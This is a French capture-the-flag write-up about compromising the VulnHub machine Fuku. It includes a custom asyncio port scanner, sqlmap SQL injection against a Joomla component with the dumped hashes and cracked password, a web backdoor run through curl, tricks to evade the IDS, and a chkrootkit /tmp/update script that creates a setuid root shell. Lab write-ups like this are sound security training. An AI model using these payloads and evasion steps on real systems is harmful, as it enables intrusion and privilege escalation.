# Solution du CTF SecTalks: BNE0x02 - Fuku de VulnHub

Le CTF [Fuku](https://vulnhub.com/entry/sectalks-bne0x02-fuku,140/) était intéressant car il nous met quelques batons dans les roues. Il faut utiliser de la programation ou bien trouver quelques astuces pour parvenir à nos fins.

C'est parti, on lance un scan de port Nmap... et ça ne semble pas en finir...

Je tente une connexion sur le port 80 pour voir si j'en tire quelque chose :

```shellsession
$ ncat 192.168.56.94 80 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.94:80.
HTTP/1.0 200 OK
Server: Apache/2.4.0 (Ubuntu)

<html>
<body>
FUKU!</body>
```

Le serveur nous donne une réponse HTTP alors que l'on n'a rien envoyé, ce n'est pas normal.

## Déméler le vrai du faux

Je teste un autre port au hasard : idem ! Le serveur répond donc par une réponse générique sur tous les ports normalement fermés. Sans doute qu'en interne une règle `iptables` redirige tous ces ports sur un service unique.

Il faut donc écrire un programme pour scanner les ports et voir si on obtient une réponse différente de celle par défaut.

Je me suis lancé dans Python avec `asyncio` pour cet exercice :

```python
import sys
import asyncio

class PortscanProtocol(asyncio.Protocol):
    def __init__(self, port, finished):
        self.port = port
        self.finished = finished

    def connection_made(self, transport):
        self.transport = transport
        transport.write(b"GET / HTTP/1.0\r\n\r\n")

    def data_received(self, data):
        message = data.decode()
        if "FUKU!</body>" not in message:
            print(f"port {self.port} is real")
        self.transport.close()

    def connection_lost(self, exception):
        self.finished.set_result(True)


async def main(range_start):
    loop = asyncio.get_running_loop()

    tasks = set()
    for port in range(int(range_start), 65536):
        task = loop.create_future()
        tasks.add(task)
        try:
            transport, protocol = await loop.create_connection(
                lambda: PortscanProtocol(port, task),
                '192.168.56.94',
                port
            )
        except OSError as exception:
            print(exception)
            tasks.remove(task)

        while True:
            if len(tasks) > 30:
                done, __ = await asyncio.wait(tasks, timeout=0.2, return_when=asyncio.FIRST_COMPLETED)
                if done:
                    for task in done:
                        tasks.remove(task)
                        await task
            else:
                break

    await asyncio.sleep(1)

asyncio.run(main(sys.argv[1]))

```

C'est tout de même assez long mais éventuellement on y arrive :

```
$ python3 find_port.py
port 22 is real
port 13370 is real
```

J'ai aussi remarqué que si la cadence est trop rapide le faux service crashe et on obtient des erreurs *No route to host*.

Une astuce pourrait être de bourriner exprès et de faire ensuite un scan normal en ignorant ces erreurs.

## JoomJoom

Sur le port 13370 on trouve une installation de *Joomla!*

Je trouve cet exploit sur exploit-db :

[Joomla! Component com_hdflvplayer &lt; 2.1.0.1 - SQL Injection - Multiple webapps Exploit](https://www.exploit-db.com/exploits/35220)

Bien qu'il y ait un code d'exploitation il y a aussi un exemple pour utiliser `sqlmap`, j'applique donc à mon URL :

```bash
python sqlmap.py -u "http://192.168.56.94:13370/index.php?option=com_hdflvplayer&id=4" -p id --dbms mysql  --risk 3 --level 5
```

On est dans les meilleurs circonstances pour l'exploitation :

```
[22:25:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:25:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:25:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:25:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:25:57] [INFO] target URL appears to have 22 columns in query
[22:26:00] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 102 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: option=com_hdflvplayer&id=4 AND 6962=6962

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: option=com_hdflvplayer&id=4 AND (SELECT 4787 FROM (SELECT(SLEEP(5)))DbDB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: option=com_hdflvplayer&id=-2420 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x784d4a7a76444f7952514c49746b765a514372584648507a4f416f576e644b41654f62445a54637a,0x7162717871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[22:26:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 14.10 or 15.04 (utopic or vivid)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
```

Obtenir les dumps va donc très vite, par exemple la liste des bases de données :

```
available databases [6]:                                                                                                                                                                                         
[*] fuku
[*] fuku2
[*] information_schema
[*] mysql
[*] performance_schema
[*] tacacs
```

La première base de données correspond à un Joomla et dispose de la table `jos_users` :

```
Database: fuku
Table: jos_users
[2 entries]
+----+-----+---------------+------------------+-------+----------+---------------------+-------------------------------------------------------------------+-----------+------------+---------------------+---------------------+
| id | gid | name          | email            | block | username | usertype            | password                                                          | sendEmail | activation | registerDate        | lastvisitDate       |
+----+-----+---------------+------------------+-------+----------+---------------------+-------------------------------------------------------------------+-----------+------------+---------------------+---------------------+
| 62 | 25  | Administrator | admin@email.fuku | 0     | admin    | Super Administrator | 8dce0c268a72ec988999cb5a59fadd35:K30ubzQvaQaHbs0peZrM78GBMWbe5KQb | 1         | <blank>    | 2015-08-07 10:58:51 | 2015-08-09 13:32:29 |
| 63 | 25  | Gizmo         | gizmo@fuku.email | 0     | gizmo    | Super Administrator | 6da55fdfcf53a4b3a07390921866cc18:qECsCP9t5NwPILY77j6hGM2MrgX4Je39 | 0         | <blank>    | 2015-08-07 01:01:34 | 2015-08-17 14:31:04 |
+----+-----+---------------+------------------+-------+----------+---------------------+-------------------------------------------------------------------+-----------+------------+---------------------+---------------------+
```

La base de données `tacacs` ne semble pas avoir un role quelconque :

```
Database: tacacs                                                                                                                                                                                                 
[16 tables]
+--------------+
| user         |
| access       |
| accounting   |
| acl          |
| admin        |
| attribute    |
| command      |
| component    |
| config       |
| contact_info |
| failure      |
| host         |
| node         |
| profile      |
| vcomponent   |
| vendor       |
+--------------+
```

il y a tout de même des identifiants mais qui ne semblent pas utilisables :

```
Database: tacacs
Table: admin
[1 entry]
+-------+------+-------+----------+---------------+
| uid   | link | vrows | priv_lvl | password      |
+-------+------+-------+----------+---------------+
| admin | 0    | 25    | 15       | ht70zyjHsMl3A |
+-------+------+-------+----------+---------------+
```

J'ai recopié les hashs du Joomla! et les ait convertit dans un format spécifique pour `JohnTheRipper` :

```
admin:$dynamic_1$8dce0c268a72ec988999cb5a59fadd35$K30ubzQvaQaHbs0peZrM78GBMWbe5KQb:::::::
gizmo:$dynamic_1$6da55fdfcf53a4b3a07390921866cc18$qECsCP9t5NwPILY77j6hGM2MrgX4Je39:::::::
```

Casser le password de `gizmo` est instantané :

```
Loaded 2 password hashes with 2 different salts (dynamic_1 [md5($p.$s) (joomla) 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
sillyboy         (gizmo)
```

## FUKU

Les identifiants permettent donc un accès admin sur le Joomla! via le path `/administrator`.

La procédure pour ajouter du code consiste à modifier un fichier de thème et est décrite dans le writeup pour le [CTF Rosee de Wizard Labs](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Rosee%20de%20Wizard%20Labs.md).

Quand j'ai voulu ajouter une backdoor appelant `system()` ma requête HTTP a été bloquée et les communications avec la VM aussi.

Il doit y avoir un IDS qui a détecté le payload.

J'ai à la place ajouté le code plus générique utilisé par exemple sur le [CTF Underdist #3](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Underdist%20%233%20de%20VulnHub.md#you-got-mail).

Je peux alors exécuter des commandes de cette façon :

```shellsession
$ curl -s http://192.168.56.94:13370/ --data "&f=system&a=lsb_release -a" | head -5
Distributor ID: Ubuntu
Description:    Ubuntu 15.04
Release:        15.04
Codename:       vivid
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
```

Je remarque aussique certaines commandes semblent remplacées. Par exemple un `which wget` retourne le message suivant :

> haha! FUKU! Only root can run that command.

On peut obtenir le résultat que l'on souhaite avec un `whereis wget` :

> wget: /usr/bin/wget /usr/share/man/man1/wget.1.gz

De la même façon au lieu de faire `uname -a` pour connaître l'architecture de la VM on peut faire un `file /bin/ps` :

> /bin/ps: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=3ef3cd330ed989bd19a2d307d4792deff6f4abe5, stripped

Et si on a peur d'être bloqué par l'IDS en faisant transiter le mot `wget` sur le réseau on peut copier l'exécutable sur un autre nom via un wildcard puis utiliser la copie :

```bash
cp /usr/bin/wge* /tmp/dv
```

Une fois reverse-ssh uploadé puis exécuté je suis tranquille car les communications sont chiffrées.

Je trouve un premier flag :

```shellsession
www-data@Fuku:/var/www/html$ cat flag.txt 
Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
Maybe you found it after getting a shell, by using a command like "find / -name flag.txt" ?
Random keyboard smash: J7&fVbh2kTy[JgS"98$vF4#;>mGcT
```

Je vois deux processus intéressants :

```
daemon    1384  0.0  2.0 105516 21360 ?        Ssl  08:01   0:00 /usr/local/bin/portspoof -c /etc/portspoof.conf -D
root      1408  0.0  0.3   5732  3144 ?        S    08:01   0:00 /bin/bash /root/chkrootkit-0.49/run_chkrootkit
```

Le premier est le service qui donne la réponse par défaut. Le fichier de configuration est comme ceci :

```
1-65535 "HTTP/1\.0 200 OK\r\nServer: Apache/(2\.4\.\d) \(Ubuntu\)\r\n\r\n<html>\r\n<body>\r\nFUKU!</body>\r\n</html>"
```

Quand on liste les ports en écoute on s'apperçoit que seul le port 444 est utilisé par `portspoof`. Toutefois je n'ai pas vui de règles de pare-feu donc le fonctionnement reste un mystère.

Le second process m'intéresse car je sais que chkrootkit a été touché par une vulnérabilité d'escalade de privilèges ([Chkrootkit 0.49 - Local Privilege Escalation - Linux local Exploit](https://www.exploit-db.com/exploits/33899)) que j'ai déjà utilise pour [le CTF Froggy de Wizard Labs](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Froggy%20de%20Wizard%20Labs.md).

Ici nous n'avons pas accès en lecture au script `/root/chkrootkit-0.49/run_chkrootkit` donc on suppose qu'il faut créer un script au chemin par défaut `/tmp/update`.

Voici les commandes que j'ai placé :

```bash
#!/bin/bash
cp /bin/dash /tmp/devloop_was_here
chmod 4755 /tmp/devloop_was_here
```

Et après quelques minutes :

```shellsession
www-data@Fuku:/var/www/html$ ls -al /tmp/devloop_was_here 
-rwsr-xr-x 1 root root 110K Jan  4 08:31 /tmp/devloop_was_here
www-data@Fuku:/var/www/html$ /tmp/devloop_was_here
# cd /root
# ls
19700101      chkrootkit-0.49  flag.txt  g++-4.9  gcc-4.9  gcc-ar-4.9  gcc-nm-4.9  gcc-ranlib-4.9  ifconfig  mlocate    python     uname  whoami
change_ip.sh  cpp-4.9          fuku      gcc      gcc-ar   gcc-nm      gcc-ranlib  id              locate    portspoof  python2.7  which
# cat flag.txt
Yep, this is a flag. It's worth over 9000 Internet points!
Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&*iuGf)8$d4gfh%4
```

On voit ici les vrais binaires que l'auteur du CTF a remplacé.

## Alternative ending

J'ai vu que d'autres participants ont utilisé `Joomscan` et qu'il y avait une faille de reset de password sans vérifications. Voir par exemple cette solution :[BNE0x02 - Fuku Writeup](https://gknsb.blogspot.com/2016/05/bne0x02-fuku-writeup.html).

*Publié le 4 janvier 2023*
